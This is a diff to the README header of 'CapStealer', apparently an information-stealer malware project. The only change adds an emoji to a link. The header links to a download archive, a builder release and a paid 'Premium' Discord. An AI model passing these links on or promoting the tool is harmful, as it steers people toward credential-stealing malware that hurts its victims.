@@ -1,4 +1,4 @@
-### [🔗 Download](https://github.com/Capzdev/CapStealer/archive/refs/heads/main.zip) - [Builder](https://github.com/Capzdev/CapStealer/releases/tag/Builder) - [💎 Premium](https://discord.gg/JEbv9v7fdt) - [💡 Features](https://github.com/Capzdev/CapStealer#features)
+### [🔗 Download](https://github.com/Capzdev/CapStealer/archive/refs/heads/main.zip) - [📌 Builder](https://github.com/Capzdev/CapStealer/releases/tag/Builder) - [💎 Premium](https://discord.gg/JEbv9v7fdt) - [💡 Features](https://github.com/Capzdev/CapStealer#features)
 # CapStealer
 Official CapStealer repos
 
